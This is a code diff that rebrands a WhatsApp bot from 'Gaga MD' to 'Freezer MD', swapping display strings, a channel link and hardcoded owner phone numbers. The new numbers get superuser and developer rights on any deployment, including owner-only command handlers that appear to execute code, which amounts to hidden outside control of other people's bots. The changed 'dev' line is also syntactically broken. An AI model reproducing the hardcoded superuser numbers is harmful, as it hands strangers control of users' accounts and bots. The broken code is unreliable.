@@ -143,7 +143,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['GAGA-MD', "safari", "1.0.0"],
+      browser: ['FREEZER-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -195,7 +195,7 @@ zk.ev.on('call', async (callData) => {
     if (currentTime - lastTextTime >= messageDelay) {
       // Send the rejection message if the delay has passed
       await client.sendMessage(callerId, {
-        text:'❗📵I AM GAGA MD | I REJECT THIS CALL BECAUSE MY OWNER IS BUSY. KINDLY SEND TEXT INSTEAD``\n\n> keep using xgaga bots.'
+        text:'❗📵I AM FREEZER MD | I REJECT THIS CALL BECAUSE MY OWNER IS BUSY. KINDLY SEND TEXT INSTEAD``\n\n> keep using xgaga bots.'
       });
 
       // Update the last text time
@@ -261,7 +261,7 @@ function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
   let notification = `*『 🥷 ᴀɴᴛɪᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 🥷 』*\n\n`;
   notification += `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ :* ${new Date().toLocaleString()}\n`;
-  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> keep using xgaga bots`;
+  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> keep using Freezer bots`;
   return notification;
 }
 
@@ -376,7 +376,7 @@ function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
   let notification = `*『🥷 ᴀɴᴛɪᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 🥷』*\n\n`;
   notification += `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ :* ${new Date().toLocaleString()}\n`;
-  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> keep using xgaga bots`;
+  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> keep using Freezer bots`;
   return notification;
 }
 
@@ -631,10 +631,10 @@ let lastReactionTime = 0;
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254112291443", '254729269118', '254757232472', "254112291443", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254110642442", '254798757856', "254791553079", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254112291443', '254729269118', "254757232472", '254757232472'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254110642442', "254798757856", '254791553079 => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -642,7 +642,7 @@ let lastReactionTime = 0;
           quoted: ms
         });
       }
-      console.log("\t [][]...{Gaga-Md}...[][]");
+      console.log("\t [][]...{Freezer-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -738,7 +738,7 @@ let lastReactionTime = 0;
       
       if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
         zk.sendMessage(auteurMessage, {
-          'text': "🚫am blocking you because you have violated Gaga md policies🚫!"
+          'text': "🚫am blocking you because you have violated Freezer md policies🚫!"
         });
         await zk.updateBlockStatus(auteurMessage, 'block');
       }
@@ -800,7 +800,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
       if (texte && texte.startsWith('<')) {
   if (!superUser) {
-    return repondre("🚫 The command to be excuted by Gaga or Xgaga bots owner 🚫");
+    return repondre("🚫 The command to be excuted by Freezer or Freezer-Md bots owner 🚫");
   }
   
   try { 
@@ -817,15 +817,15 @@ zk.ev.on("messages.upsert", async (m) => {
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `🚫 The command to be excuted by Gaga or Xgaga bots owner 🚫`;
+    const menuText = `🚫 The command to be excuted by Freezer or Freezer-Md bots owner 🚫`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
       contextInfo: {
         externalAdReply: {
-          title: "XGAGA BOTS" ,
-          body: "KEEP USING XGAGA BOTS",
-          sourceUrl: "https://whatsapp.com/channel/0029VasnifMFi8xW4Mqysn2F" ,
+          title: "FREEZER-MD BOTS" ,
+          body: "KEEP USING FREEZER-MD BOTS",
+          sourceUrl: "https://whatsapp.com/channel/0029Vb5mxL6F1YlTPss80Y2t" ,
           thumbnailUrl: "https://files.catbox.moe/sfk02i.jpg" || conf.BOT_MENU_LINK,
           mediaType: 1,
           showAdAttribution: true,
@@ -979,7 +979,7 @@ if (texte && texte.startsWith('>')) {
         const yes = await verifierEtatJid(origineMessage)
         if (texte.includes('https://') && verifGroupe &&  yes  ) {
 
-         console.log("『 ❌🚫 𝚇𝙶𝙰𝙶𝙰 𝙱𝙾𝚃𝚂 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺 🚫 ❌ 』")
+         console.log("『 ❌🚫 FREEZER-MD 𝙱𝙾𝚃𝚂 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺 🚫 ❌ 』")
             var verifZokAdmin = verifGroupe ? admins.includes(idBot) : false;
             
              if(superUser || verifAdmin || !verifZokAdmin  ) { console.log('je fais rien'); return};
@@ -1362,10 +1362,10 @@ if (texte && texte.startsWith('>')) {
         connection
       } = con;
       if (connection === "connecting") {
-        console.log("ℹ️ Gaga md connecting in your account...");
+        console.log("ℹ️ Freezer md connecting in your account...");
       } else if (connection === 'open') {
         
-         console.log("✅ Gaga Md connected successfully✔");
+         console.log("✅ Freezer Md connected successfully✔");
         console.log("--");
         0;
         await baileys_1.delay(200);
@@ -1373,14 +1373,14 @@ if (texte && texte.startsWith('>')) {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" Gaga-md installing plugins😇\n\n");
+        console.log(" Freezer-md installing plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
         fs.readdirSync(__dirname + "/plugins").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
               require(__dirname + "/plugins/" + fichier);
-              console.log(fichier + "Successfully installed Gaga Md commands✔️");
+              console.log(fichier + "Successfully installed Freezer Md commands✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
             } /* require(__dirname + "/plugins/" + fichier);
@@ -1399,7 +1399,7 @@ if (texte && texte.startsWith('>')) {
         } else {
           md = "undefined";
         }
-        console.log("Gaga md successfully connected✅");
+        console.log("Freezer md successfully connected✅");
         await activateCrons();
                 const date = new Date();
                 const formattedDate = date.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', timeZone: conf.TIMEZONE });
@@ -1425,7 +1425,7 @@ if (texte && texte.startsWith('>')) {
 
         if (conf.DP.toLowerCase() === 'yes') {
           await zk.sendMessage(zk.user.id, {
-            text: `*Gaga MD* connected successfully ✅
+            text: `*Freezer MD* connected successfully ✅
             
      Please update your bot now to connect latest version 
             
